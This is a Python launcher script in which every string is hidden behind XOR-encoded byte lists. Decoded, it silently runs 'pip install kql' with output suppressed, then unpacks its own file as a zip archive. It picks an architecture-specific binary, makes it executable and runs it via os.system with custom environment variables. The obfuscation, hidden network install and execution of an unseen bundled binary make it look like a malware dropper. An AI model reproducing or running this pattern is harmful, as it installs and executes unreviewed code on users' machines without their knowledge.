D=(lambda x,y:''.join(chr(A^x)for A in y))(60,[])
C=chr
H=print
G=H
A=(lambda x,y:D.join(C(A^x)for A in y))(87,[])
B=C
import zipfile as K,os as E,shutil as M,tempfile as N,sys as F,platform as O,os,socket as I,importlib.util
def J():
	try:I.create_connection(((lambda x,y:D.join(C(A^x)for A in y))(229,[221,203,221,203,221,203,221]),53),timeout=3);return True
	except OSError:return False
def L(module_name):return importlib.util.find_spec(module_name)is not None
if not L((lambda x,y:D.join(C(A^x)for A in y))(255,[148,142,147])):
	if J():P=(lambda x,y:D.join(C(A^x)for A in y))(222,[224,176,171,178,254,236,224,248,239])if os.name==(lambda x,y:D.join(C(A^x)for A in y))(16,[126,100])else(lambda x,y:D.join(C(A^x)for A in y))(84,[106,123,48,49,34,123,58,33,56,56,116,102,106,114,101]);os.system(f"{((lambda x,y:D.join(C(A^x)for A in y)))(113,[1,24,1,81,24,31,2,5,16,29,29,81,26,0,29,81])}{P}")
	else:H((lambda x,y:D.join(C(A^x)for A in y))(93,[9,40,47,51,125,18,19,125,52,51,41,56,47,51,56,41,125,41,50,125,13,47,50,62,56,56,57,115]))
def Q():
	P=E.path.dirname(E.path.abspath(F.argv[0]));I=N.mkdtemp()
	try:
		Q=E.path.abspath(F.argv[0])
		with K.ZipFile(Q,(lambda x,y:D.join(C(A^x)for A in y))(164,[214]))as R:R.extractall(I)
		H=O.machine();L={(lambda s:A.join(B(A^151)for A in s))([246,229,250,225,160,251]):(lambda s:A.join(B(A^11)for A in s))([106,121,102,110,106,105,98,38,125,60,106]),(lambda s:A.join(B(A^69)for A in s))([36,55,40,51,125,41]):(lambda s:A.join(B(A^179)for A in s))([210,193,222,214,210,209,218,158,197,132,210]),(lambda s:A.join(B(A^134)for A in s))([231,244,235]):(lambda s:A.join(B(A^177)for A in s))([208,195,220,212,208,211,216,156,199,134,208]),(lambda s:A.join(B(A^54)for A in s))([87,87,68,85,94,0,2]):(lambda s:A.join(B(A^4)for A in s))([101,118,105,50,48,41,114,60,101]),(lambda s:A.join(B(A^130)for A in s))([227,240,239,180,182]):(lambda s:A.join(B(A^199)for A in s))([166,181,170,241,243,234,177,255,166]),(lambda s:A.join(B(A^189)for A in s))([197,133,139]):(lambda s:A.join(B(A^200)for A in s))([176,240,254]),(lambda s:A.join(B(A^108)for A in s))([5,90,84,90]):(lambda s:A.join(B(A^39)for A in s))([95,31,17]),(lambda s:A.join(B(A^173)for A in s))([213,149,155,242,155,153]):(lambda s:A.join(B(A^71)for A in s))([63,127,113,24,113,115]),(lambda s:A.join(B(A^208)for A in s))([177,189,180,230,228]):(lambda s:A.join(B(A^176)for A in s))([200,136,134,239,134,132])}
		if H not in L:G((lambda s:A.join(B(A^171)for A in s))([254,197,216,222,219,219,196,217,223,206,207,139,202,217,200,195,194,223,206,200,223,222,217,206,145,139,142,216])%H);F.exit(1)
		S=L[H];J=E.path.join(I,S)
		if not E.path.exists(J):G((lambda s:A.join(B(A^97)for A in s))([52,15,18,20,17,17,14,19,21,4,5,65,0,19,2,9,8,21,4,2,21,20,19,4,91,65,68,18])%H);F.exit(1)
		E.chmod(J,493);E.chdir(P);T=(lambda s:A.join(B(A^128)for A in s))([229,248,240,239,242,244,160,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,189,164,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,186,165,243,175,236,233,226,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,200,207,205,197,189,165,243,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,223,197,216,197,195,213,212,193,194,204,197,189,165,243,160,166,166,160,165,243,160,165,243])%(F.prefix,F.prefix,F.executable,J,(lambda x,y:D.join(C(A^x)for A in y))(158,[190]).join(F.argv[1:]));E.system(T)
	except K.BadZipFile:G((lambda s:A.join(B(A^206)for A in s))([139,188,188,161,188,244,238,154,166,171,238,180,167,190,238,168,167,162,171,238,167,189,238,173,161,188,188,187,190,186,171,170,238,161,188,238,160,161,186,238,175,238,180,167,190,238,168,167,162,171,224]))
	except Exception as U:G((lambda s:A.join(B(A^195)for A in s))([130,173,227,166,177,177,172,177,227,172,160,160,182,177,177,166,167,249,227,230,176])%U)
	finally:M.rmtree(I)
if __name__==(lambda s:A.join(B(A^30)for A in s))([65,65,115,127,119,112,65,65]):Q()
